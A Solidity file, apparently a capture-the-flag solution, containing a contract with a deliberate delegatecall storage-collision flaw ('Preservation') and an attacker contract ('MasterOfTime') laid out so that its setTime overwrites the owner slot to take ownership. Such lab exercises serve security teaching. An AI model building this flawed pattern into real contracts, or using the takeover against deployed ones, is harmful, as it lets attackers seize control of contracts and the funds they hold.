// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "hardhat/console.sol";


//goal:  claim ownership
contract Preservation {

  address public timeZone1Library; //slot 0
  address public timeZone2Library; //slot 1
  address public owner;  //slot 2
  uint storedTime; //slot 3

  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress)  {
    console.log("Preservation:constuctor called \n\ttz1=%s \n\ttz2=%s \n\towner=%s", _timeZone1LibraryAddress, _timeZone2LibraryAddress, msg.sender);
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  function setFirstTime(uint _timeStamp) public {
    console.log("setFirst %s", _timeStamp);
    (bool success, ) = timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    require(success, "zone1 delegation fail");
  }

  function setSecondTime(uint _timeStamp) public {
    console.log("setSecond %s", _timeStamp);
    (bool success, ) = timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    require(success, "zone2 delegation fail");
  }
}

contract TimeLibraryContract {

  uint storedTime;  //slot 0

  function setTime(uint _time) public {
    storedTime = _time;
    console.log("Timestamp set to %s confirmed", _time);
  }
}







///////////////////////////////////////////////////////////////

contract MasterOfTime {

    uint abc; //slot 0
    uint cdef; //slot 1
    uint target;  //slot 2
    uint blabla; //slot 3

  function setTime(uint _time) public {
    target = _time;
    console.log("Target set to %s confirmed", _time);
  }
}


